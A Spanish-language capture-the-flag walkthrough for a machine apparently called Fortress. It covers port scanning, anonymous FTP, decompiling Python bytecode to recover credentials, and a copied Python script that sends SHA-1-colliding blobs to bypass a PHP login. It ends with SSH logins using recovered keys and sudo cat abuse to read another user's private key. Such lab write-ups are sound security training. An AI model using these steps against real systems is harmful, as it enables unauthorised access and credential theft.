###Tags: `` `` ``

# Escaneo (*22,5581,5752,7331*)

```css
sudo nmap -p- --open -sSCV --min-rate 4000 -vvv -n -Pn <ip> -oN escaneo
```
![image](https://github.com/user-attachments/assets/22e7607e-cb95-468b-a4d8-de6d863b9345)

-  En la descripción del CTF nos dice que agreguemos estos dos dominios al **/etc/hosts** `fortress y temple.fortress`

# FTP (*anonymous*)

Nos conectamos como el user **anonymous** sin proporcionar contraseña y nos traemos el ``.txt`` y un `.file`

```ruby
 ftp 10.10.11.86 -p 5581
```
![image](https://github.com/user-attachments/assets/9db41c68-2eed-4b8e-bb7b-2ab1c7d4e0a9)

Le hacemos un cat al archivo `marked.txt` y dice lo siguiente:

```
If youre reading this, then know you too have been marked by the overlords... Help memkdir /home/veekay/ftp I have been stuck inside this prison for days no light, no escape... Just darkness... Find the backdoor and retrieve the key to the map... Arghhh, theyre coming... HELLLPPPPPmkdir /home/veekay/ftp
```

Vemos una ruta `home/veekay/ftp`, un usuario `veekay`
Y el archivo `.file` es un es un archivo de bytes compilado en Python 2.7

![image](https://github.com/user-attachments/assets/0b4b41a8-189a-49d0-aad2-e26822e44e47)

### Descompilar 

Vamos a descompilar el archivo de esta manera usando `uncompyle2`, este repo lo que hace es descompilar el código de bytes de la versión 2.5, 2.6, 2.7 de Python

```ruby
https://github.com/BlueEffie/uncompyle2.git
cd uncompyle2
sudo python2 setup.py install
cd ..
uncompyle2 .file
```

![image](https://github.com/user-attachments/assets/f8ee0d00-43d5-4e8e-9f6e-899b7e872389)

Creé un pequeño script en Python que me permitiría decodificar las credenciales que espera el servicio. 

```python
from Crypto.Util.number import long_to_bytes 

usern = 232340432076717036154994 
passw = 10555160959732308261529999676324629831532648692669445488 

print(long_to_bytes(usern)) 
print(long_to_bytes(passw))
```

![image](https://github.com/user-attachments/assets/020333d9-94df-4190-90cb-603ade47ab34)

Ahora como vemos llama al puerto 5752 que nos podemos conectar por **telnet** poniendo estas credenciales 

```ruby
 telnet <ip> 5752
```

Observamos como una clave `t3mple_0f_y0ur_51n5`

![image](https://github.com/user-attachments/assets/ab1fe7d9-3197-42e8-a2a7-86d784d4cfdf)

# Port 7331

En la web ponemos `http://fortress:7331/t3mple_0f_y0ur_51n5.php` y en código fuente vemos lo siguiente

![image](https://github.com/user-attachments/assets/19660ad2-3058-4890-bd15-f780b3f345a9)

Probando con mas extensiones, en  `http://fortress:7331/t3mple_0f_y0ur_51n5.html`

![image](https://github.com/user-attachments/assets/0a54cb88-1047-4354-aea0-105015713157)

Y acá la verdad probando cosas no encontré nada y tuve que ver como se hacia y es de esta manera:
Primero tenemos que ir a este [Enlace](https://github.com/bl4de/ctf/blob/master/2017/BostonKeyParty_2017/Prudentialv2/Prudentialv2_Cloud_50.md) y copiarnos este script:

```python
#!/usr/bin/env python
import requests

# this is copy/paste from Hex editor - two different files with the same SHA1 checksum
name = '255044462D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7F46DC93 A6B67E01 3B029AAA 1DB2560B 45CA67D6 88C7F84B 8C4C791F E02B3DF6 14F86DB1 690901C5 6B45C153 0AFEDFB7 6038E972 722FE7AD 728F0E49 04E046C2 30570FE9 D41398AB E12EF5BC 942BE335 42A4802D 98B5D70F 2A332EC3 7FAC3514 E74DDC0F 2CC1A874 CD0C7830 5A215664 61309789 606BD0BF 3F98CDA8 044629A1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

password = '25504446 2D312E33 0A25E2E3 CFD30A0A 0A312030 206F626A 0A3C3C2F 57696474 68203220 3020522F 48656967 68742033 20302052 2F547970 65203420 3020522F 53756274 79706520 35203020 522F4669 6C746572 20362030 20522F43 6F6C6F72 53706163 65203720 3020522F 4C656E67 74682038 20302052 2F426974 73506572 436F6D70 6F6E656E 7420383E 3E0A7374 7265616D 0AFFD8FF FE002453 48412D31 20697320 64656164 21212121 21852FEC 09233975 9C39B1A1 C63C4C97 E1FFFE01 7346DC91 66B67E11 8F029AB6 21B2560F F9CA67CC A8C7F85B A84C7903 0C2B3DE2 18F86DB3 A90901D5 DF45C14F 26FEDFB3 DC38E96A C22FE7BD 728F0E45 BCE046D2 3C570FEB 141398BB 552EF5A0 A82BE331 FEA48037 B8B5D71F 0E332EDF 93AC3500 EB4DDC0D ECC1A864 790C782C 76215660 DD309791 D06BD0AF 3F98CDA4 BC4629B1 3C68746D 6C3E0A3C 73637269 7074206C 616E6775 6167653D 6A617661 73637269 70742074 7970653D 22746578 742F6A61 76617363 72697074 223E0A3C 212D2D20 40617277 202D2D3E 0A0A7661 72206820 3D20646F 63756D65 6E742E67 6574456C 656D656E 74734279 5461674E 616D6528 2248544D 4C22295B 305D2E69 6E6E6572 48544D4C 2E636861 72436F64 65417428 31303229 2E746F53 7472696E 67283136 293B0A69 66202868 203D3D20 27373327 29207B0A 20202020 646F6375 6D656E74 2E626F64 792E696E 6E657248 544D4C20 3D20223C 5354594C 453E626F 64797B62 61636B67 726F756E 642D636F 6C6F723A 5245443B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 383B3C2F 48313E22 3B0A7D20 656C7365 207B0A20 20202064 6F63756D 656E742E 626F6479 2E696E6E 65724854 4D4C203D 20223C53 54594C45 3E626F64 797B6261 636B6772 6F756E64 2D636F6C 6F723A42 4C55453B 7D206831 7B666F6E 742D7369 7A653A35 3030253B 7D3C2F53 54594C45 3E3C4831 3E262378 31663634 393B3C2F 48313E22 3B0A7D0A 0A3C2F73 63726970 743E0A0A'

print '[+] create URL decoded strings to send as GET parameters [name] and [password]...'
name = ''.join(name.split(' '))
password = ''.join(password.split(' '))

namestr = ''.join(['%' + name[i] + name[i + 1]
           for i in range(0, len(name)) if i % 2 == 0])

passwordstr = ''.join(['%' + password[j] + password[j + 1]
           for j in range(0, len(password)) if j % 2 == 0])

print '[+] sending request to http://54.202.82.13/?name=[name]&password=[password]'

u = 'http://fortress:7331/t3mple_0f_y0ur_51n5.php?user={}&pass={}'.format(namestr, passwordstr)

resp = requests.get(u, headers={
    'Host': 'fortress'
})

print '[+] read FLAG from response...\n\n'
print resp.content
```

Ahora lo ejecutamos y obtenemos un archivo llamado `m0td_f0r_j4x0n.txt`

![image](https://github.com/user-attachments/assets/570a6019-fda2-4e9d-9628-deca889f5da0)

Encontramos una clave `id_rsa` que puede ser del user `h4rdy`

![image](https://github.com/user-attachments/assets/40c782df-a40a-4bfe-85a8-a2da51f09e57)

## SSH (`h4rdy`)

Lo que tenemos que hacer es iniciar sesión con h4rdy usuario con el siguiente comando:

```ruby
 nano id_rsa
 chmod 600 id_rsa
 ssh -i id_rsa h4rdy@<IP> -t "bash --noprofile"
```

![image](https://github.com/user-attachments/assets/85459f49-11e7-4c27-906f-54081be12ffa)

# Escalada (`j4x0n`)

Poniendo `sudo -l` observamos que podemos ejecutar **/bin/cat** como el usuario *j4x0n*

![image](https://github.com/user-attachments/assets/e7cd23e7-b0af-41d9-a6f2-e96ac06e43d4)
![image](https://github.com/user-attachments/assets/e5c71fac-56a4-4e23-bd86-2a66a65f9882)

Ahora tratamos de obtener su **id_rsa** de esta manera  y tuvimos éxito! ---> `/usr/bin/sudo -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa`

![image](https://github.com/user-attachments/assets/3f9f3171-6550-4f44-8057-3bee03f9a9a3)

Nos conectamos de esta manera como el user **j4x0n**

```ruby
 nano j4x0n_rsa
 chmdo 600 j4x0n_rsa
 ssh -i j4x0n_rsa j4x0n@<IP> -t "bash --noprofile" 
```
![image](https://github.com/user-attachments/assets/ca51b137-3f84-43a3-ba53-31b604a7079a)

# Escalada ``ROOT``

En el directorio `/data` , tenemos un archivo `setup.sh` que se utiliza para configurar la máquina cada vez que se enciende.
Puedo encontrar las banderas y la contraseña de root aquí

![image](https://github.com/user-attachments/assets/de2a589c-f439-4424-9b49-6912e9178747)

